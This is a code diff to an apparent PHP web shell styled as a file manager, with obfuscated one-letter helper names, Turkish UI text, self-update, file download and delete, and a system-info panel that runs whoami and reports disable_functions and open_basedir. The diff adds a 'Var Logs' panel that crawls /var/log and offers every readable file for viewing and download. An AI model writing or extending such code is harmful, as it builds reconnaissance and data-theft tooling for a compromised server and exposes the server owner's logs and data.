@@ -242,6 +242,23 @@ function preview_file($path){
     $note = filesize($path) > 524288 ? "<div class='muted' style='margin-bottom:6px'>Showing first 512 KB</div>" : "";
     return [true, $name, $note."<pre style='max-height:70vh;margin:0'>".htmlspecialchars($raw, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')."</pre>"];
 }
+function list_readable_logs($base = '/var/log'){
+    if(!is_dir($base) || !is_readable($base)) return [false, $base." is not readable", ""];
+    $rows = [];
+    try{
+        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
+        foreach($it as $f){
+            if(!$f->isFile() || !$f->isReadable()) continue;
+            $p = $f->getPathname();
+            $act = H("?preview=".urlencode(basename($p))."&path=".urlencode(dirname($p)), "View") . H("?download=".urlencode(basename($p))."&path=".urlencode(dirname($p)), "DL");
+            $rows[] = [htmlspecialchars($p, ENT_QUOTES, 'UTF-8'), K((int)$f->getSize()), L($p), $act];
+            if(count($rows) >= 500) break;
+        }
+    }catch(Exception $e){ return [false, "Error scanning ".$base, ""]; }
+    if(!$rows) return [true, "No readable files in ".$base, "<div class='card'><p class='muted' style='margin:0'>No readable files found in ".htmlspecialchars($base)."</p></div>"];
+    $h = "<div class='card'><h3>Readable Logs (".count($rows).")</h3>".G(["Path","Size","Modified","Actions"], $rows)."</div>";
+    return [true, "Found ".count($rows)." readable files", $h];
+}
 function sys_info(){
     $who = function_exists('shell_exec') ? trim((string)@shell_exec('whoami')) : '';
     if($who === '' && function_exists('posix_geteuid') && function_exists('posix_getpwuid')){
@@ -255,17 +272,13 @@ function sys_info(){
     $dt = @disk_total_space($dir);
     $disk = ($df !== false && $dt !== false) ? K($df).' / '.K($dt) : '--';
     $rows = [
-        ['User (whoami)', $who.' (uid/gid: '.$uid.')'],
-        ['Hostname', @gethostname() ?: '--'],
-        ['OS / Kernel', @php_uname() ?: PHP_OS],
-        ['PHP Version', PHP_VERSION],
+        ['User (whoami)', $who.' (uid/gid: '.$uid.')'], ['Hostname', @gethostname() ?: '--'],
+        ['OS / Kernel', @php_uname() ?: PHP_OS], ['PHP Version', PHP_VERSION],
         ['Server', isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '--'],
         ['Server IP', isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname(@gethostname() ?: 'localhost')],
-        ['Document Root', isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '--'],
-        ['Disk Free / Total', $disk],
+        ['Document Root', isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '--'], ['Disk Free / Total', $disk],
         ['Extensions', 'ZipArchive: '.(class_exists('ZipArchive')?'yes':'no').' | cURL: '.(function_exists('curl_init')?'yes':'no')],
-        ['open_basedir', ini_get('open_basedir') ?: 'none'],
-        ['disable_functions', ini_get('disable_functions') ?: 'none'],
+        ['open_basedir', ini_get('open_basedir') ?: 'none'], ['disable_functions', ini_get('disable_functions') ?: 'none'],
     ];
     $h = "<div class='card'><h3>System Info</h3><table><tbody>";
     foreach($rows as $r){
@@ -318,6 +331,7 @@ if(!I()){
 }
 if(D("preview")){ list($ok, $title, $html) = preview_file(rtrim(J(), "/\\") . "/" . sanitize_path(D("preview"))); respond($ok, $title, ["html" => $html]); }
 if(D("dirsize")){ $sz = dir_size(rtrim(J(), "/\\") . "/" . sanitize_path(D("dirsize"))); respond($sz !== false, $sz !== false ? $sz : "Cannot calculate size"); }
+if(D("varlog")){ list($ok, $msg, $html) = list_readable_logs(); if(is_ajax()) respond($ok, $msg, ["html" => $html]); Y("<!DOCTYPE html><html><head><meta charset='utf-8'>".render_css()."</head><body><div class='wrap'>".($html ?: $msg)."</div></body></html>"); }
 if(D("sysinfo")){ $html = sys_info(); if(is_ajax()) respond(true, "System info loaded", ["html" => $html]); Y("<!DOCTYPE html><html><head><meta charset='utf-8'>".render_css()."</head><body><div class='wrap'>".$html."</div></body></html>"); }
 if(D("update")){ list($ok, $msg) = self_update(); respond($ok, $msg); }
 if(D("delete")){
@@ -373,6 +387,7 @@ $ui .= H("?path=".urlencode(U(J())), "[Directory Up]");
 $ui .= H("?zip=.&path=".urlencode(J()), "[Bu dizini ZIP indir]");
 $ui .= H("?update=1&path=".urlencode(J()), "[Update]");
 $ui .= H("?sysinfo=1&path=".urlencode(J()), "[System Info]");
+$ui .= H("?varlog=1&path=".urlencode(J()), "[Var Logs]");
 $ui .= (stripos(PHP_OS, "WIN")===0?V():"");
 $ui .= "</div>";
 $ui .= "<div id='phfm-sys'></div>";
@@ -382,22 +397,12 @@ $ui .= "<div id='phfm-modal' class='modal'><div class='modal-box'><div class='mo
 $ui .= "<script>
 (function(){
   var msgBox = document.getElementById('phfm-msg');
-  function showMsg(ok, text){
-    msgBox.style.display = 'block';
-    msgBox.style.background = ok ? '#052e16' : '#450a0a';
-    msgBox.style.borderColor = ok ? '#22c55e' : '#ef4444';
-    msgBox.style.color = '#f8fafc';
-    msgBox.textContent = text;
-  }
+  function showMsg(ok, text){ msgBox.style.display='block'; msgBox.style.background=ok?'#052e16':'#450a0a'; msgBox.style.borderColor=ok?'#22c55e':'#ef4444'; msgBox.style.color='#f8fafc'; msgBox.textContent=text; }
   function refreshList(){
-    return fetch(location.href, {credentials:'same-origin'})
-      .then(function(r){ return r.text(); })
-      .then(function(html){
-        var doc = new DOMParser().parseFromString(html, 'text/html');
-        var next = doc.getElementById('phfm-list');
-        var cur = document.getElementById('phfm-list');
-        if(next && cur) cur.innerHTML = next.innerHTML;
-      });
+    return fetch(location.href, {credentials:'same-origin'}).then(function(r){ return r.text(); }).then(function(html){
+      var doc = new DOMParser().parseFromString(html, 'text/html'), next = doc.getElementById('phfm-list'), cur = document.getElementById('phfm-list');
+      if(next && cur) cur.innerHTML = next.innerHTML;
+    });
   }
   var modal = document.getElementById('phfm-modal'), mTitle = document.getElementById('phfm-mt'), mBody = document.getElementById('phfm-mb');
   function closeModal(){ if(modal) modal.classList.remove('open'); }
@@ -428,16 +433,15 @@ $ui .= "<script>
         .catch(function(){ dsz.textContent = 'Calc'; showMsg(false, 'Boyut hesaplanamadı'); });
       return;
     }
-    var sys = e.target.closest('a[href*=\"?sysinfo=\"]');
-    if(sys){
+    var pnl = e.target.closest('a[href*=\"?sysinfo=\"],a[href*=\"?varlog=\"]');
+    if(pnl){
       e.preventDefault();
       var box = document.getElementById('phfm-sys');
-      if(box && box.innerHTML !== ''){ box.innerHTML = ''; return; }
-      var sUrl = sys.href + (sys.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1';
-      fetch(sUrl, {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
+      if(box && box.innerHTML !== '' && box.getAttribute('data-src') === pnl.href){ box.innerHTML = ''; return; }
+      fetch(pnl.href + (pnl.href.indexOf('?') === -1 ? '?' : '&') + 'ajax=1', {headers:{'X-Requested-With':'XMLHttpRequest'}, credentials:'same-origin'})
         .then(function(r){ return r.json(); })
-        .then(function(res){ if(res.ok && res.html && box) box.innerHTML = res.html; else showMsg(false, res.msg || 'Hata'); })
-        .catch(function(){ showMsg(false, 'Sistem bilgisi alınamadı'); });
+        .then(function(res){ if(res.ok && res.html && box){ box.setAttribute('data-src', pnl.href); box.innerHTML = res.html; } else showMsg(false, res.msg || 'Hata'); })
+        .catch(function(){ showMsg(false, 'Veri alınamadı'); });
       return;
     }
     var upd = e.target.closest('a[href*=\"?update=\"]');
